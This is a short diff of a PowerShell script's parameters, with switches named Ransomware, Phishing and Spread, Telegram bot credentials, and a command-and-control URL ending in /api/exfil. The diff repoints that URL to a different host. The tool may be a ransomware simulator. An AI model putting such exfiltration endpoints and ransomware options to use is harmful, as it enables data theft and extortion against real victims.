@@ -24,7 +24,7 @@ param(
     [switch]$Ransomware,
     [switch]$Phishing,
     [switch]$Spread,
-    [string]$C2Url = "https://ransim-v3.vercel.app/api/exfil",
+    [string]$C2Url = "https://bom-kaos-kaki.vercel.app/api/exfil",
     [string]$TelegramToken = "",
     [string]$ChatId = ""
 )
